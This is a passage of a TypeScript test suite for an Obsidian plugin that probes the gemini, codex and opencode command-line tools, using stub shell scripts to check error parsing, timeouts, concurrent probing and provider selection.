					"unexpected status 404 Not Found: The model `gpt-5.5` does not exist or you do not have access to it.",
				);
				assert.doesNotMatch(probe.detail, /did not answer/);
			},
		);
	});

	it("strips codex's retry counter from the reason", () => {
		// Measured shape. The counter is codex's own progress, not the failure, and
		// when the probe's timeout lands mid-retry it is the whole message.
		assert.equal(
			extractProviderError(
				"codex",
				'{"type":"error","message":"Reconnecting... 3/5 (unexpected status 404 Not Found: The model `gpt-5.5` does not exist or you do not have access to it.)"}',
			),
			"unexpected status 404 Not Found: The model `gpt-5.5` does not exist or you do not have access to it.",
		);
	});

	it("leaves a message with no retry counter alone", () => {
		// The counter is a codex convention, not a general shape. Stripping must not
		// touch a message from another provider or one that only mentions a
		// reconnect in passing.
		assert.equal(
			extractProviderError(
				"opencode",
				'{"type":"error","error":{"name":"UnknownError","data":{"message":"Reconnecting took 3 retries","ref":"err_1"}}}',
			),
			"Reconnecting took 3 retries (err_1)",
		);
	});

	it("reports broken when the CLI exits with nothing usable in either stream", () => {
		sandbox({ opencode: "echo nothing useful >&2\nexit 2" }, () => {
			const probe = probeCapability("opencode", { timeoutMs: 5_000 });
			assert.equal(probe.state, "broken");
			assert.match(probe.detail, /nothing useful/);
		});
	});

	it("asks with the fixed probe prompt, as one argv element", () => {
		// The stub records its own argv, so this asserts the argv the plugin really
		// built rather than a re-derivation of it.
		sandbox(
			{ gemini: `printf '%s\\n' "$@" > /tmp/gd-args-gemini.txt\nprintf '%s' '{"response":"{}"}'` },
			() => {
				probeCapability("gemini", { timeoutMs: 5_000 });
			},
		);
		const args = readFileSync("/tmp/gd-args-gemini.txt", "utf8").split("\n").filter(Boolean);
		rmSync("/tmp/gd-args-gemini.txt", { force: true });
		assert.deepEqual(args, ["-p", PROBE_PROMPT, "-o", "json"]);
	});

	it("adds codex's repo-check bypass because the probe runs outside a repository", () => {
		sandbox(
			{ codex: `printf '%s\\n' "$@" > /tmp/gd-args-codex.txt\necho not-in-a-repo >&2\nexit 1` },
			() => {
				probeCapability("codex", { timeoutMs: 5_000 });
			},
		);
		const args = readFileSync("/tmp/gd-args-codex.txt", "utf8").split("\n").filter(Boolean);
		rmSync("/tmp/gd-args-codex.txt", { force: true });
		assert.deepEqual(args, ["exec", PROBE_PROMPT, "--json", "--skip-git-repo-check"]);
	});

	it("probes from the os temp directory, not from a repository", () => {
		// A probe that ran inside a user's repo would be one model call with that
		// repo's AGENTS.md and CLAUDE.md in context. The cwd is asserted by the stub
		// recording where it was started.
		sandbox({ gemini: "pwd > /tmp/gd-cwd.txt\nprintf '%s' '{\"response\":\"{}\"}'" }, () => {
			probeCapability("gemini", { timeoutMs: 5_000 });
		});
		const cwd = readFileSync("/tmp/gd-cwd.txt", "utf8").trim();
		rmSync("/tmp/gd-cwd.txt", { force: true });
		assert.equal(path.resolve(cwd), path.resolve(tmpdir()));
	});

	it("stamps the probe with the injected clock", () => {
		sandbox({ gemini: `printf '%s' '{"response":"{}"}'` }, () => {
			assert.equal(probeCapability("gemini", { timeoutMs: 5_000, now: () => 1234 }).checkedAt, 1234);
		});
	});
});

describe("detectProviders", () => {
	it("returns one entry per provider, in the fixed preference order", () => {
		sandbox(ALL_ANSWER, () => {
			const probes = detectProviders({ timeoutMs: 5_000 });
			assert.deepEqual(
				probes.map((probe) => probe.provider),
				["gemini", "codex", "opencode"],
			);
			for (const probe of probes) {
				assert.equal(probe.state, "works");
				assert.ok(probe.detail.length > 0);
			}
			// All three working means the first in the fixed order wins.
			assert.equal(selectProvider(null, probes), "gemini");
		});
	});

	it("falls past an installed-but-broken CLI to one that answers", () => {
		// The acceptance case for P0-a: gemini present and broken, codex absent,
		// opencode working. Selection has to land on opencode with no manual choice
		// set, which is exactly the state this machine is in for gemini.
		sandbox(
			{
				gemini: `cat >&2 <<'EOF'
{"error":{"message":"Please set an Auth method","code":41}}
EOF
exit 41`,
				opencode: REPLIES.opencode,
			},
			() => {
				const probes = detectProviders({ timeoutMs: 5_000 });
				assert.equal(probes.find((probe) => probe.provider === "gemini")?.state, "broken");
				assert.equal(probes.find((probe) => probe.provider === "codex")?.state, "absent");
				assert.equal(probes.find((probe) => probe.provider === "opencode")?.state, "works");
				assert.equal(selectProvider(null, probes), "opencode");
			},
		);
	});

	it("selects nothing when none of them works", () => {
		sandbox({}, () => {
			assert.equal(selectProvider(null, detectProviders({ timeoutMs: 5_000 })), null);
		});
	});
});

// The async path is what the plugin actually runs, and it is a separate spawn
// implementation with its own timeout and kill logic. It is asserted against the
// same stubs rather than the real CLIs, so these stay as fast as the rest.
describe("detectProvidersAsync", () => {
	it("agrees with the synchronous probe", async () => {
		await sandboxAsync(ALL_ANSWER, async () => {
			const probes = await detectProvidersAsync({ timeoutMs: 5_000 });
			assert.deepEqual(
				probes.map((probe) => [probe.provider, probe.state]),
				[
					["gemini", "works"],
					["codex", "works"],
					["opencode", "works"],
				],
			);
		});
	});

	it("returns the fixed preference order regardless of who finishes first", async () => {
		// The order has to survive concurrency, or the cached list and the settings
		// display would shuffle between passes. gemini answers instantly and opencode
		// takes the longest, so a naive map over completion order would reverse them.
		await sandboxAsync(
			{
				gemini: REPLIES.gemini,
				codex: 'sleep 0.6\n' + REPLIES.codex,
				opencode: 'sleep 1.2\n' + REPLIES.opencode,
			},
			async () => {
				const probes = await detectProvidersAsync({ timeoutMs: 8_000 });
				assert.deepEqual(
					probes.map((probe) => probe.provider),
					["gemini", "codex", "opencode"],
				);
				for (const probe of probes) assert.equal(probe.state, "works");
			},
		);
	});

	it("runs the probes concurrently rather than one after another", async () => {
		// The reason the async path exists: three sequential blocking probes froze the
		// Obsidian main thread for 37-43s, measured. Asserted on wall clock so the
		// property cannot be lost to a refactor that quietly goes back to sequential.
		await sandboxAsync(
			{
				gemini: 'sleep 0.8\n' + REPLIES.gemini,
				codex: 'sleep 0.8\n' + REPLIES.codex,
				opencode: 'sleep 0.8\n' + REPLIES.opencode,
			},
			async () => {
				const started = Date.now();
				await detectProvidersAsync({ timeoutMs: 8_000 });
				const elapsed = Date.now() - started;
				// Sequential would be at least 2400ms plus three shell startups.
				assert.ok(elapsed < 2_000, `three 0.8s probes took ${elapsed}ms, so they were sequential`);
			},
		);
	});

	it("reads the CLI's own error out of a process it had to kill", async () => {
		// codex's real behaviour on this machine: a 404 for its default model, then
		// reconnects for the better part of a minute. The async path kills it at the
		// limit, and the partial output it kept is the only place the 404 exists.
		await sandboxAsync(
			{
				codex: `cat <<'EOF'
{"type":"error","message":"Reconnecting... 2/5 (unexpected status 404 Not Found: The model \`gpt-5.5\` does not exist or you do not have access to it.)"}
EOF
sleep 30`,
			},
			async () => {
				const probe = await probeCapabilityAsync("codex", { timeoutMs: 800 });
				assert.equal(probe.state, "broken");
				assert.equal(
					probe.detail,
					"unexpected status 404 Not Found: The model `gpt-5.5` does not exist or you do not have access to it.",
				);
			},
		);
	});

	it("reports absent when the binary is not on PATH", async () => {
		await sandboxAsync({}, async () => {
			const probe = await probeCapabilityAsync("gemini", { timeoutMs: 5_000 });
			assert.equal(probe.state, "absent");
			assert.match(probe.detail, /not found on PATH/);
		});
	});

	it("reports broken for a CLI that hangs, and returns promptly", async () => {
		// The kill has to happen: without it a hung CLI would never resolve and the
		// retest button would hang with it.
		await sandboxAsync({ gemini: "sleep 30" }, async () => {
			const started = Date.now();
			const probe = await probeCapabilityAsync("gemini", { timeoutMs: 800 });
			const elapsed = Date.now() - started;
			assert.equal(probe.state, "broken");
			assert.match(probe.detail, /did not answer within/);
			assert.ok(elapsed < 5_000, `the 800ms limit took ${elapsed}ms`);
		});
	});

	it("kills a CLI that ignores a polite termination", async () => {
		// SIGTERM, not SIGKILL: a CLI that traps SIGTERM and keeps running would
		// still hold the stdout pipe open past the limit, and `close` waits for the
		// pipe. Measured on codex, which leaves workers behind.
		await sandboxAsync({ opencode: "trap '' TERM\nsleep 30" }, async () => {
			const started = Date.now();
			const probe = await probeCapabilityAsync("opencode", { timeoutMs: 800 });
			assert.equal(probe.state, "broken");
			assert.ok(Date.now() - started < 5_000, "a SIGTERM-ignoring CLI was not killed");
		});
	});
});

describe("selectProvider", () => {
	const probe = (provider: ProviderId, state: ProviderProbe["state"]): ProviderProbe => ({
		provider,
		state,
		detail: "d",
		checkedAt: 0,
	});

	it("picks the first working CLI in the fixed order", () => {
		const probes = [probe("gemini", "broken"), probe("codex", "works"), probe("opencode", "works")];
		assert.equal(selectProvider(null, probes), "codex");
	});

	it("skips absent and broken CLIs rather than picking the first installed one", () => {
		// This is the acceptance case: gemini is installed on this machine and
		// cannot authenticate, so selection must fall through to codex or opencode.
		const probes = [probe("gemini", "broken"), probe("codex", "absent"), probe("opencode", "works")];
		assert.equal(selectProvider(null, probes), "opencode");
	});

	it("honours a manual choice even when that CLI is broken", () => {
		// Switching away from a CLI the user picked is how the plugin stops being
		// predictable. The settings tab shows the broken state instead.
		const probes = [probe("gemini", "broken"), probe("opencode", "works")];
		assert.equal(selectProvider("gemini", probes), "gemini");
	});

	it("returns null when nothing answered", () => {
		const probes = [probe("gemini", "broken"), probe("codex", "absent"), probe("opencode", "absent")];
		assert.equal(selectProvider(null, probes), null);
	});

	it("returns null with no probes at all", () => {
		assert.equal(selectProvider(null, []), null);
	});
});

describe("sanitizeProbes", () => {
	const good: ProviderProbe = { provider: "gemini", state: "broken", detail: "not authed", checkedAt: 5 };

	it("keeps a well-formed entry", () => {
		assert.deepEqual(sanitizeProbes([good]), [good]);
	});

	it("returns nothing for a cache that is missing or not an array", () => {
		assert.deepEqual(sanitizeProbes(null), []);
		assert.deepEqual(sanitizeProbes(undefined), []);
		assert.deepEqual(sanitizeProbes({ probes: [good] }), []);
		assert.deepEqual(sanitizeProbes("gemini"), []);
	});

	it("drops entries a hand-edited data.json got wrong", () => {
		// data.json is editable and survives upgrades, so every field is untrusted.
		// A state outside the three, or an unknown provider, must not reach the
		// settings tab dressed as a result.
		const raw = [
			{ provider: "gemini", state: "fine", detail: "d", checkedAt: 1 },
			{ provider: "claude", state: "works", detail: "d", checkedAt: 1 },
			{ provider: "codex", state: "works", checkedAt: 1 },
			{ provider: "opencode", state: "works", detail: "  ", checkedAt: 1 },
			"not an object",
			good,
		];
		assert.deepEqual(sanitizeProbes(raw), [good]);
	});

	it("substitutes zero for a missing or non-finite timestamp", () => {
		const out = sanitizeProbes([{ provider: "gemini", state: "works", detail: "d" }]);
		assert.equal(out.length, 1);
		assert.equal(out[0].checkedAt, 0);
	});
});
